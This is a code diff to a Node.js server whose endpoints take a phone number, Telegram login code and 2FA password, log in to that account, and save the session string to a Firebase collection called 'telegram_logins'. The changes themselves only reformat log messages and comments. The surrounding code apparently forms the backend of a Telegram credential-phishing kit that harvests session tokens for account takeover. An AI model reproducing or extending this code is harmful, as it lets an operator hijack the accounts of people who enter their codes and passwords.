@@ -54,18 +54,18 @@ app.post('/send-otp', async (req,res)=>{
       settings: new Api.CodeSettings({})
     }));
 
+    // Save temp session
     tempSessions[phone] = { client, phoneCodeHash: result.phoneCodeHash };
+    console.log(`[OTP SENT] ${phone}`);
 
-    console.log("OTP sent:", phone);
     res.json({ success:true });
-
   } catch(err){
-    console.error("SEND OTP ERROR:", err);
+    console.error("[SEND OTP ERROR]", err.message);
     res.status(500).json({ success:false, error:err.message });
   }
 });
 
-// 🔹 STEP 2: Login + 2FA
+// 🔹 STEP 2: Login + handle 2FA
 app.post('/login', async (req,res)=>{
   let { phone, otp, password } = req.body;
   if(!phone || !otp) return res.json({ success:false, message:'Phone & OTP required' });
@@ -89,14 +89,14 @@ app.post('/login', async (req,res)=>{
       } else throw err;
     }
 
-    // If password provided, signIn with 2FA
+    // If 2FA password provided
     if(password){
       await client.checkPassword(password);
     }
 
     // Save session string
     const sessionString = client.session.save();
-    console.log("LOGIN SUCCESS:", phone);
+    console.log(`[LOGIN SUCCESS] ${phone}`);
 
     // Save to Firebase
     await db.ref('telegram_logins').push({
@@ -113,11 +113,11 @@ app.post('/login', async (req,res)=>{
     res.json({ success:true, message:'Login successful' });
 
   } catch(err){
-    console.error("LOGIN ERROR:", err.message);
+    console.error("[LOGIN ERROR]", err.message);
     res.json({ success:false, message:err.message });
   }
 });
 
-// ================= START =================
+// ================= START SERVER =================
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, ()=>console.log("Server running on port",PORT));
+app.listen(PORT, ()=>console.log(`Server running on port ${PORT}`));
